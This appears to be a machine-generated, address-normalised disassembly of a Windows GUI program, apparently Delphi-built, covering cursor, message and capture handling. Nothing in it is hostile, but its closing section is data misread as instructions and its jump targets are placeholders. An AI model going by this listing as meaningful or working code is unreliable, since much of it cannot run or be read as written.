call sub_444c04
pop ecx
sub_444c84
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
mov esi [ edi + 0x14 ]
test esi esi
je r-xdata
mov eax [ edi + 0x14 ]
call sub_442910
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x64 ]
je r-xdata
mov bl 0x1
jmp r-xdata
cmp [ edi + 0x24 ] 0x0
jne r-xdata
mov eax esi
call sub_442910
dec eax
jne r-xdata
test bl bl
je r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add eax [ edx + 0xc ]
add eax 0xe
mov [ ebp - 0x4 ] eax
mov eax edi
call sub_442f08
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edi + 0x14 ]
call sub_444c84
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_4449ac
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ edi + 0x14 ]
call sub_4431d8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ edi + 0x14 ]
call sub_442b0c
mov eax edi
call sub_442efc
test eax eax
je r-xdata
mov eax edi
call sub_442f08
mov esi eax
mov eax esi
call sub_442e24
push eax
mov eax esi
call sub_442960
pop edx
sub edx eax
sub edx [ edi + 0x24 ]
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov eax edi
call sub_442efc
call sub_442e24
sub eax [ edi + 0x24 ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
mov eax esi
call sub_442e24
mov edx eax
sub edx [ edi + 0x24 ]
mov eax esi
call sub_442e4c
mov eax esi
call sub_442e24
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_442e4c
mov eax edi
call sub_442f08
call sub_442e9c
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov eax edi
call sub_442960
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_442e4c
mov eax edi
call sub_442efc
call sub_442e9c
mov bl 0x1
jmp r-xdata
sub_444dbc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_443170
test eax eax
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x10 ]
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x40 ]
call sub_412910
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_443964
test eax eax
je r-xdata
push ebp
call sub_444c04
pop ecx
push ebp
call sub_444c84
pop ecx
jmp r-xdata
xor ebx ebx
mov ebx [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
push ebx
mov edx ebx
mov eax esi
call sub_444b88
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
sub_444e44
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov eax [ edi ]
mov ebx [ eax + 0x18 ]
mov eax [ edi ]
mov esi [ eax + 0x60 ]
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax esi
mov edx 0x2
call sub_4429f0
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jl r-xdata
mov eax esi
mov edx 0x1
call sub_4429f0
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jl r-xdata
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_444b38
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_444b38
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x54 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov edx [ edi ]
mov [ edx + 0x54 ] eax
jmp r-xdata
sub_444ed4
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4452ac
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x202
jg r-xdata
sub eax 0x203
je r-xdata
je r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_40682c
lea edx [ ebp - 0x44 ]
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_443964
mov esi eax
test esi esi
je r-xdata
sub eax 0xae2d
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x32 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx ebx
mov esi [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
sub eax 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_444908
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_40682c
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_443964
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call GetCursorPos
lea ecx [ ebp - 0x44 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_439e90
mov eax [ ebp - 0x44 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x8 ] eax
cmp [ ebx + 0x8 ] 0x1
jne r-xdata
sub eax 0x1e0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4452b3
lea eax [ ebp - 0x48 ]
call sub_403e54
retn
mov edx ebx
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebx + 0x8 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0xb00b
jne r-xdata
cmp [ ebp - 0x10 ] 0x14
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_440b28
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
dec eax
je r-xdata
call sub_438bac
push 0x1
xor ecx ecx
xor edx edx
mov eax [ esi + 0x4 ]
call sub_43b040
jmp r-xdata
test esi esi
je r-xdata
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_403e54
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_444dbc
jmp r-xdata
mov edi [ esi + 0x4 ]
mov eax edi
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_43f658
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_4449bc
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_40682c
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x44 ]
mov [ eax + 0x50 ] edx
mov edx [ ebp - 0x40 ]
mov [ eax + 0x54 ] edx
push ebp
call sub_444e44
pop ecx
mov eax [ ebp - 0x4 ]
call sub_4449bc
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_40682c
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_443964
mov esi eax
test esi esi
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax 0x2
je r-xdata
xor edx edx
mov eax edi
call sub_43a26c
jmp r-xdata
mov eax edi
call sub_456aec
jmp r-xdata
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_443964
mov esi eax
test esi esi
je r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_439cec
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x20 ]
sub eax [ esi + 0x40 ]
add eax eax
sub [ ebp - 0x20 ] eax
mov eax [ ebp - 0x1c ]
sub eax [ esi + 0x44 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x18 ]
sub edx [ ebp - 0x20 ]
sub eax edx
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
lea edx [ ebp - 0x48 ]
mov eax esi
call sub_43a34c
mov edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_403ea8
mov eax [ ebx + 0x8 ]
lea edi [ eax + 0x18 ]
lea esi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
sub eax 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4448a8
jmp r-xdata
mov eax [ esi + 0x14 ]
movzx eax [ eax + 0x10 ]
movsx edx [ eax * 2 + rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4581ec
push eax
call SetCursor
mov [ ebx + 0xc ] 0x1
jmp r-xdata
push 0x0
push 0x203
push 0x203
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_440b28
push eax
lea eax [ ebp - 0x3c ]
push eax
call PeekMessageA
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x9b ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
cmp [ eax + 0x5d ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
call sub_43a9e8
jmp r-xdata
sub_4452bc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030d4
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x8 ] 0x5
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
add esp 0xfffffff0
call sub_403428
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jge r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov al 0x1
mov [ esi + 0xd ] al
xor edx edx
mov eax esi
call sub_445430
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
mov eax [ rw-data ]
cmp [ eax ] 0xa
jge r-xdata
sub_44534c
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_445408
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030f4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_4453b0
push ebx
push esi
mov esi eax
push 0x4b
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x20 ] bl
test bl bl
je r-xdata
pop esi
pop ebx
retn
push 0x0
lea eax [ esi + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
sub_4453e0
push ebx
push ecx
mov ebx eax
push esp
lea eax [ ebx + 0x10 ]
push eax
lea ecx [ ebx + 0x14 ]
lea edx [ ebx + 0x24 ]
lea eax [ ebx + 0x1c ]
call sub_406918
mov [ ebx + 0x18 ] eax
cmp [ ebx + 0x1c ] 0x0
setne al
mov [ ebx + 0x20 ] al
pop edx
pop ebx
retn
sub_445408
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44537c
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
jne r-xdata
push esi
call SetCapture
call ReleaseCapture
jmp r-xdata
sub_445430
push ebx
mov ebx eax
sub edx 0x1
jb r-xdata
mov eax ebx
call sub_445394
cmp [ ebx + 0xd ] 0x0
jne r-xdata
sub edx 0x67
je r-xdata
mov eax ebx
call sub_4453b0
pop ebx
retn
mov eax ebx
call sub_4453e0
jmp r-xdata
cmp [ ebx + 0x20 ] 0x0
je r-xdata
jmp r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call SendMessageA
mov [ ebx + 0x10 ] eax
push 0x0
lea eax [ ebx + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
jmp r-xdata
sub_445494
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
push 0x8000
call SetErrorMode
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4455fa
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
call GetModuleHandleA
mov ebx eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call SetErrorMode
retn
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_445718
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp bl 0x3
je r-xdata
test bl bl
jne r-xdata
mov dl 0x1
mov eax esi
call sub_4456fc
cmp [ rw-data ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_4456fc
jmp r-xdata
push esi
call [ rw-data ]
mov edi eax
test edi edi
je r-xdata
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax ebx
dec al
je r-xdata
push 0x0
push edi
call [ rw-data ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
push edi
push esi
call [ rw-data ]
push 0x1
push edi
call [ rw-data ]
jmp r-xdata
jmp r-xdata
push 0x1
push edi
call [ rw-data ]
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax [ esp ]
and eax 0xfffffff4
xor edx edx
mov dl bl
movzx edx [ edx + rw-data ]
or eax edx
mov [ esp ] eax
sub_445808
mov eax [ rw-data ]
mov eax [ eax ]
call sub_403104
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_403104
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
call sub_403104
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_403104
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_403e54
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_403e54
cmp [ rw-data ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_445890
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_445a08
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetCurrentProcessId
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax r-xdata
call sub_408be0
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_403ea8
mov eax [ rw-data ]
call sub_404314
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
call GetCurrentThreadId
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
lea edx [ ebp - 0x20 ]
mov ecx 0x1
mov eax r-xdata
call sub_408be0
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_403ea8
mov eax [ rw-data ]
call sub_404314
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
mov eax [ rw-data ]
call sub_404314
push eax
call RegisterWindowMessageA
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_413f80
mov [ rw-data ] eax
call sub_445494
mov dl 0x1
mov eax [ r-xdata ]
call sub_4452bc
mov [ rw-data ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_457ac8
mov edx [ rw-data ]
mov [ edx ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_458bac
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x1
call sub_45a794
mov ecx r-xdata
mov edx sub_437408
mov eax [ r-xdata ]
call sub_413734
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445a0f
lea eax [ ebp - 0x10 ]
call sub_403e54
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_445a5a
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_445abb
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445ac2
retn
mov eax rw-data
call sub_40d078
call sub_445808
mov eax rw-data
mov ecx 0x16
mov edx [ r-xdata ]
call sub_4048dc
mov eax rw-data
call sub_403e54
mov eax rw-data
call sub_403e54
sub_445ac4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_445b4a
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445b51
retn
call GetVersion
and eax 0xff
cmp ax 0x4
setae [ rw-data ]
call sub_445890
mov eax [ r-xdata ]
call sub_4135a8
mov eax [ r-xdata ]
call sub_413648
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4135f4
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4135f4
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4135f4
sub_445d98
stc
push ebx
push eax
inc [ ebp + 0x44 ]
add [ ebp + 0x67900044 ] cl
inc esp
add [ eax + 0x11004467 ] dh
push esp
inc ebx
jne r-xdata
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dh
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080004 ] al
outsb
inc ebx
push 0x65676e61
js r-xdata
outsd
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
rcr [ ebp + 0x44 ] 0x0
or [ eax ] al
or [ ecx + 0x63 ] al
je r-xdata
inc esp
add [ esp + eax * 2 ] cl
inc ecx
add ah cl
fwait
inc ecx
pushad
xor eax [ eax ]
push esp
xor eax [ eax ]
pushfd
xor [ eax ] al
mov eax 0xf4004030
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
add [ eax - 0x80000000 ] al
pop es
add [ eax ] cl
dec edi
inc esp
add [ eax ] cl
add bh bh
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090005 ] al
outsb
inc ebp
js r-xdata
dec eax
add [ eax ] al
dec [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x6e4f0900
dec esp
imul esi [ ebx + 0x74 ] 0x725c0006
inc esp
add [ eax ] bh
add [ eax ] al
push [ eax + eax ]
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
push es
dec ecx
insd
popad
jae r-xdata
add [ eax ] ch
inc ebx
inc ecx
add [ esp + ebx * 4 + 0x66180041 ] ah
inc esp
add [ esp + ebx * 4 - 0x6253ffbf ] dh
inc ecx
add ah bl
lahf
inc ecx
add ah al
pushfd
inc ecx
add [ esp + ebx * 4 - 0x601bffbf ] bh
inc ecx
add [ eax - 0x63ffbb9c ] cl
inc sp
add al bl
inc esp
add [ ebx ] cl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
outsd
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
xor al 0x27
inc ecx
add [ edx ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x5e380000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x445e ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x5e ] dh
inc esp
add [ eax ] ch
add [ eax ] al
adc [ ebp + 0x44 ] bl
add ah al
lahf
inc ecx
add [ eax + 0x33 ] bl
inc eax
add [ eax ] bl
cdq
inc ecx
add [ eax + 0x33 ] ah
inc ecx
popad
je r-xdata
add [ eax + 0x56 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x44 ] bl
add [ eax ] dh
add [ eax ] al
add [ ebp + ebx + 0x41 ] dh
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
arpl [ ebp + 0x74 ] si
aam 0x13
inc ecx
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0006 ] al
outsb
push ebx
je r-xdata
pop es
or edx [ ecx + eax * 2 + 0x63 ]
je r-xdata
pop esp
inc esp
add [ eax ] bl
add bh bh
shl [ edi + 0x44 ] 0x1
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
add eax 0x74617453
aam 0x13
inc ecx
add [ eax ] al
add bh bh
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax - 0x43ffbfd0 ] bh
imul eax [ eax + eax + 0xc ] 0xcc00446a
inc ebx
jne r-xdata
inc ecx
add [ esi + edx * 2 + 0x41 ] dl
add [ eax ] ch
dec ebx
inc ecx
add al cl
push edi
inc ecx
add [ eax + ebx * 2 ] ah
inc ecx
add al bh
pop eax
inc ecx
add al ch
push ecx
inc ecx
add [ ecx + ebx * 2 ] dh
inc ecx
add [ eax - 0x1fffbea7 ] ch
outsd
inc esp
add al bl
push ebx
inc ecx
add [ esi + eax * 2 + 0x54740041 ] al
inc ecx
add [ esp + edx * 2 + 0x55200041 ] dh
inc ecx
add ah dl
dec edx
inc ecx
add [ eax - 0x23ffbeaa ] dh
dec esp
inc ecx
add [ eax - 0x13ffbeb3 ] dh
push esi
inc ecx
add ah bh
push esi
inc ecx
add [ esi + ecx * 2 ] dl
inc ecx
add [ eax + 0x4e ] ch
inc ecx
add [ edi + ecx * 2 ] dl
inc ecx
add [ eax + edx * 2 + 0x51040041 ] ch
inc ecx
add [ eax + 0x3c004151 ] bl
push esp
inc ecx
add [ eax + 0x54 ] bl
inc ecx
add [ eax + 0x57 ] dl
inc ecx
add [ eax + 0x60004155 ] ah
pop ecx
inc ecx
add [ eax + 0x59 ] dh
inc ecx
add [ 0x6f685354 ] cl
jb r-xdata
lea eax [ eax ]
les ebx [ edi + 0x44 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x60 ] dh
inc esp
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add [ eax + 0x53 ] dh
je r-xdata
add [ eax ] al
xchg esp eax
adc [ eax ] al
jl r-xdata
fwait
inc ecx
add [ eax ] ch
inc ebx
inc ecx
add [ esp + ebx * 4 - 0x5dffffbf ] ah
inc ecx
add ah bl
bound eax [ eax + eax - 0x28 ]
inc eax
add [ ecx + ebp * 2 + 0x6a0c0044 ] bh
inc esp
add ah cl
dec esp
imul esi [ ebx + 0x74 ] 0x6070c08b
inc esp
add [ edi ] al
or eax 0x6f685354
jb r-xdata
inc ecx
add [ esp + eax * 2 ] cl
inc ecx
add [ eax + ecx * 2 + 0x41 ] al
add [ edi + eax * 2 ] bh
inc ecx
add [ eax ] bl
push esi
inc ecx
add [ esi + edx * 2 + 0x41 ] cl
xor eax [ eax ]
push esp
xor eax [ eax ]
pushfd
xor [ eax ] al
mov eax 0x70004030
push ebx
inc ebx
push 0x65676e61
js r-xdata
add [ eax ] al
add al [ eax ]
out dx al
outsb
inc esp
add ah bl
lahf
inc ecx
add ah al
pushfd
inc ecx
add [ esp + ebx * 4 - 0x601bffbf ] bh
inc ecx
add [ eax + 0x69 ] ch
inc esp
add al al
mov [ 0xffffffffa2640041 ] al
inc ecx
add al bh
mov eax [ 0xffffffffa2280041 ]
inc ecx
add ah bh
mov eax [ 0x64300041 ]
inc esp
add [ eax ] al
insd
inc esp
add [ eax - 0x2bffbb94 ] bl
outsd
inc esp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x640040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
js r-xdata
movsb [ edi ] [ esi ]
pushfd
inc ecx
inc ebx
jne r-xdata
pushad
outsb
push ebp
jo r-xdata
inc esp
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080007 ] al
add [ eax ] al
mov [ 0x62dc0041 ] al
inc esp
add al bl
dec esp
imul esi [ ebx + 0x74 ] r-xdata
push ds
inc ecx
add [ eax ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x60e00000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] dh
inc esp
add [ eax + 0x61 ] bh
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
